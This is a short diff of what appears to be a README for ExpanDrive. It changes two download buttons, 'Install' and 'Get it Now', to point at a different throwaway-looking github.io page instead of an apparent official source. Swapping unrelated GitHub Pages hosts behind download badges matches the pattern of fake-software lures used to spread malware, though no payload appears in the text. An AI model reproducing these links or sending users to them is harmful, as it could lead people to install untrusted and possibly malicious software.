@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://urinoterapia-sigma.github.io/.github/expanDrive)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://six-sevens.github.io/.github/expanDrive)
 
 </div>
 
@@ -81,7 +81,7 @@ ExpanDrive's on-demand streaming model solves the storage capacity problem that 
 
 <p align="center">
 
-[![Get it Now ExpanDrive](https://img.shields.io/badge/Get_it_Now-0077B6?style=for-the-badge&logo=apple&logoColor=white)](https://urinoterapia-sigma.github.io/.github/expanDrive)
+[![Get it Now ExpanDrive](https://img.shields.io/badge/Get_it_Now-0077B6?style=for-the-badge&logo=apple&logoColor=white)](https://six-sevens.github.io/.github/expanDrive)
 
 </p>
 
